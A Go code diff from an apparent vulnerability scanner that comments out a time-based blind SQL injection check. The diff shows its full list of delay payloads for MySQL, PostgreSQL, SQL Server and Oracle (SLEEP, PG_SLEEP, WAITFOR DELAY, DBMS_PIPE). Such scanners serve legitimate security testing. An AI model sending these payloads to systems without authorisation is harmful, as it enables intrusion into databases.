@@ -2,10 +2,8 @@ package PerFile
 
 import (
 	"encoding/json"
-	"fmt"
 	"jray/addon/BugCheck/Common"
 	"jray/addon/BugCheck/Ginfo/Ghttp"
-	"math/rand"
 	"strings"
 	"sync"
 	"time"
@@ -13,40 +11,41 @@ import (
 
 var checkSleepSql map[string][]string
 
-func init() {
-	sqliSleepScan := SqliSleepScan{Common.PluginBase{Name: "Sql注入时间盲注", Desc: "存在Sql注入时间盲注", Type: "SQL注入", Ltype: "", TimeOut: 25, Level: 5},
-		3, 3, &sync.Mutex{}}
-	Common.AddBugScanListPerFile(sqliSleepScan)
-	ct := time.Now() //代表当前时间的time对象
-	ts := ct.Unix()  //unix时间戳
-	//利用时间戳设置rand的种子数
-	rand.Seed(ts)
-	r1 := rand.Intn(5)
-
-	checkSleepSql = map[string][]string{
-		"MySql": []string{fmt.Sprintf(" AND SLEEP(%d)", sqliSleepScan.SleepTimeOut),
-			fmt.Sprintf(" AND SLEEP(%d)--+", sqliSleepScan.SleepTimeOut),
-			fmt.Sprintf("' AND SLEEP(%d)", sqliSleepScan.SleepTimeOut),
-			fmt.Sprintf("' AND SLEEP(%d)--+", sqliSleepScan.SleepTimeOut),
-			fmt.Sprintf("' AND SLEEP(%d) AND '%d'='%d", sqliSleepScan.SleepTimeOut, r1, r1),
-			fmt.Sprintf("\" AND SLEEP(%d) AND \"%d\"=\"%d", sqliSleepScan.SleepTimeOut, r1, r1),
-			fmt.Sprintf("'and(select*from(select+sleep(%d))a/**/union/**/select+1)='", sqliSleepScan.SleepTimeOut),
-			fmt.Sprintf("\"and(select*from(select+sleep(%d))a/**/union/**/select+1)=\"", sqliSleepScan.SleepTimeOut),
-		}, "Postgresql": []string{
-			fmt.Sprintf(" AND %d=(SELECT %d FROM PG_SLEEP(%d))", sqliSleepScan.SleepTimeOut, r1, r1),
-			fmt.Sprintf(" AND %d=(SELECT %d FROM PG_SLEEP(%d))--+", sqliSleepScan.SleepTimeOut, r1, r1),
-		}, "Microsoft SQL Server or Sybase": []string{
-			fmt.Sprintf(" waitfor delay '0:0:%d'--+", sqliSleepScan.SleepTimeOut),
-			fmt.Sprintf("' waitfor delay '0:0:%d'--+", sqliSleepScan.SleepTimeOut),
-			fmt.Sprintf("\" waitfor delay '0:0:%d'--+", sqliSleepScan.SleepTimeOut),
-		}, "Oracle": []string{
-			fmt.Sprintf(" and 1= dbms_pipe.receive_message('RDS', %d)--+", sqliSleepScan.SleepTimeOut),
-			fmt.Sprintf("' and 1= dbms_pipe.receive_message('RDS', %d)--+", sqliSleepScan.SleepTimeOut),
-			fmt.Sprintf("\"  and 1= dbms_pipe.receive_message('RDS', %d)--+", sqliSleepScan.SleepTimeOut),
-			fmt.Sprintf(" AND 3437=DBMS_PIPE.RECEIVE_MESSAGE(CHR(100)||CHR(119)||CHR(112)||CHR(71),%d)", sqliSleepScan.SleepTimeOut),
-			fmt.Sprintf(" AND 3437=DBMS_PIPE.RECEIVE_MESSAGE(CHR(100)||CHR(119)||CHR(112)||CHR(71),%d)--+", sqliSleepScan.SleepTimeOut),
-		}}
-}
+//实现存在缺陷 暂时不支持注入
+//func init() {
+//	sqliSleepScan := SqliSleepScan{Common.PluginBase{Name: "Sql注入时间盲注", Desc: "存在Sql注入时间盲注", Type: "SQL注入", Ltype: "", TimeOut: 25, Level: 5},
+//		3, 3, &sync.Mutex{}}
+//	Common.AddBugScanListPerFile(sqliSleepScan)
+//	ct := time.Now() //代表当前时间的time对象
+//	ts := ct.Unix()  //unix时间戳
+//	//利用时间戳设置rand的种子数
+//	rand.Seed(ts)
+//	r1 := rand.Intn(5)
+//
+//	checkSleepSql = map[string][]string{
+//		"MySql": []string{fmt.Sprintf(" AND SLEEP(%d)", sqliSleepScan.SleepTimeOut),
+//			fmt.Sprintf(" AND SLEEP(%d)--+", sqliSleepScan.SleepTimeOut),
+//			fmt.Sprintf("' AND SLEEP(%d)", sqliSleepScan.SleepTimeOut),
+//			fmt.Sprintf("' AND SLEEP(%d)--+", sqliSleepScan.SleepTimeOut),
+//			fmt.Sprintf("' AND SLEEP(%d) AND '%d'='%d", sqliSleepScan.SleepTimeOut, r1, r1),
+//			fmt.Sprintf("\" AND SLEEP(%d) AND \"%d\"=\"%d", sqliSleepScan.SleepTimeOut, r1, r1),
+//			fmt.Sprintf("'and(select*from(select+sleep(%d))a/**/union/**/select+1)='", sqliSleepScan.SleepTimeOut),
+//			fmt.Sprintf("\"and(select*from(select+sleep(%d))a/**/union/**/select+1)=\"", sqliSleepScan.SleepTimeOut),
+//		}, "Postgresql": []string{
+//			fmt.Sprintf(" AND %d=(SELECT %d FROM PG_SLEEP(%d))", sqliSleepScan.SleepTimeOut, r1, r1),
+//			fmt.Sprintf(" AND %d=(SELECT %d FROM PG_SLEEP(%d))--+", sqliSleepScan.SleepTimeOut, r1, r1),
+//		}, "Microsoft SQL Server or Sybase": []string{
+//			fmt.Sprintf(" waitfor delay '0:0:%d'--+", sqliSleepScan.SleepTimeOut),
+//			fmt.Sprintf("' waitfor delay '0:0:%d'--+", sqliSleepScan.SleepTimeOut),
+//			fmt.Sprintf("\" waitfor delay '0:0:%d'--+", sqliSleepScan.SleepTimeOut),
+//		}, "Oracle": []string{
+//			fmt.Sprintf(" and 1= dbms_pipe.receive_message('RDS', %d)--+", sqliSleepScan.SleepTimeOut),
+//			fmt.Sprintf("' and 1= dbms_pipe.receive_message('RDS', %d)--+", sqliSleepScan.SleepTimeOut),
+//			fmt.Sprintf("\"  and 1= dbms_pipe.receive_message('RDS', %d)--+", sqliSleepScan.SleepTimeOut),
+//			fmt.Sprintf(" AND 3437=DBMS_PIPE.RECEIVE_MESSAGE(CHR(100)||CHR(119)||CHR(112)||CHR(71),%d)", sqliSleepScan.SleepTimeOut),
+//			fmt.Sprintf(" AND 3437=DBMS_PIPE.RECEIVE_MESSAGE(CHR(100)||CHR(119)||CHR(112)||CHR(71),%d)--+", sqliSleepScan.SleepTimeOut),
+//		}}
+//}
 
 type SqliSleepScan struct {
 	Common.PluginBase
